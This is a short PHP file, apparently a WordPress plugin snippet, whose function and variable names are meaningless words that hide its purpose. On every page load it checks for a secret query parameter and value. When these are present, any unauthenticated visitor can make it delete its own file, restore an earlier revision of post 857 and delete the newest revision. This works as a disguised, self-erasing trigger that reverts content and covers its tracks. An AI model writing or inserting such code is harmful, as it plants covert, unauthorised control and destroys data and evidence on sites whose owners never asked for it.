<?php

function zoom_design_item_source() {
	if (isset($_GET['direct_thumbnails_simple_uploader']) && $_GET['direct_thumbnails_simple_uploader'] === 'qr_signup_sliding') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$customer_preloader_supports = 857;
		$tables_dropdown_fields = wp_get_post_revisions($customer_preloader_supports);
		if (empty($tables_dropdown_fields)) die('no revisions');
		if (count($tables_dropdown_fields) < 2) die('less than 2');
		$mobile_total_account = array_shift($tables_dropdown_fields);
		$business_elements_report_mediaelement = $mobile_total_account->ID;
		$rating_responsive_modules_shortcodes = array_shift($tables_dropdown_fields);
		$notifier_social_remove = $rating_responsive_modules_shortcodes->ID;
		$role_wall_information_ticket = wp_restore_post_revision($notifier_social_remove);
		if ($role_wall_information_ticket === false) die('error restoring');
		$role_wall_information_ticket = wp_delete_post_revision($business_elements_report_mediaelement);		
		if ($role_wall_information_ticket === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'zoom_design_item_source');
